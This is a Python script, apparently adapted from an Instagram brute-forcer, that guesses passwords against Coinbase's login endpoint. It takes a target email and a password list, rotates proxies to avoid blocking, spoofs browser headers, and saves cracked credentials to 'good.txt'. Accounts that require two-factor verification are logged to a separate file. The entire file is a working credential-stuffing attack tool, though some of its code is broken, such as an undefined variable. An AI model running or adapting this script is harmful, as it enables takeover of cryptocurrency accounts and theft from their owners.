from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
import json
from colorama import Fore
CheckVersion = str(sys.version)
import re
from datetime import datetime

normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"
onlyPasswords = False



print('''
               
                           __         __
.----..-----.|__|.-----.|  |--..---.-..-----..-----.
|  __||  _  ||  ||     ||  _  ||  _  ||__ --||  -__|
|____||_____||__||__|__||_____||___._||_____||_____|
         
Author   : Gilmarfilho

depende de vpn. Use-o antes de executar a ferramenta ou fornecer um arquivo proxy        """"""""""""""""""""""""""""""""""""""""""
''')


class InstaBrute(object):
    def __init__(self):

        try:
            email = input('email: ')
            Combo = input('passList : ')
            self.CurrentProxy = ''
            self.UsedProxys = []
            UsePorxy = input('[*] Você quer usar proxy(y/n): ').upper()
            if (UsePorxy == 'Y' or UsePorxy == 'YES'):
                self.randomProxy()

            print('\n----------------------------')

        except:
            print(' The tool was arrested exit ')
            sys.exit()

        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password))
            t.start()
            thread.append(t)
            time.sleep(0.9)
        for j in thread:
            j.join()

    def randomProxy(self):
        plist = open('proxy.txt').read().splitlines()
        proxy = random.choice(plist)

        if not proxy in self.UsedProxys:
            self.CurrentProxy = proxy
            self.UsedProxys.append(proxy)
        while 1:
            try:
                print('')
                print('[*] Verificar novo ip...')
                response = requests.get('https://api.ipify.org/?format=raw', proxies={"http": proxy, "https": proxy},
                                        timeout=10.0).text
                if re.match(r'((?:\d{1,3}\.){3}\d{1,3})', response) != None:
                    print(whiteB_color + '[*] Seu ip público: %s' % response)
                    print('')
                    break
                else:
                    continue
                # if response.rtrim().ltrim() == "HTTP/1.1 400 Bad Request":
                #     raise Exception("Can not reach proxy")
                # else:
                #     break
            except Exception as e:
                print('[*] Can\'t reach proxy "%s"' % proxy)
                proxy = random.choice(plist)
            print('')

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def New_Br(self, user, pwd):
        link = 'https://www.coinbase.com/accounts/login/'
        login_url = 'https://www.coinbase.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
          'enc_password': f'#PWD_COINBASE_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.get(link)
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.coinbase.com/accounts/login/",
                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
            })

            
            data = json.loads(r.text)
            if (data['status'] == 'falhou'):
                print(red_color +'')
                print(data['message'])
                print('--> não proxy precisa de um proxy')
                UsePorxy = self.randomProxy()
            print('----------------------------')
            print (green_color + 'username: '+ user + ' | '' password: '+ pwd )
            print('----------------------------')
            if 'checkpoint_url' in r.text:
                print(('' + user + ':' + pwd + ' --> Bom hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
            if 'checkpoint_required' in r.text:
                print(('' + user + ':' + pwd + ' --> Bom hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
            elif 'two_factor_required' in r.text:
                print(('' + user + ':' + pwd + ' -->  Bom Tem que ser verificado '))
                with open('results_NeedVerfiy.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')



InstaBrute()
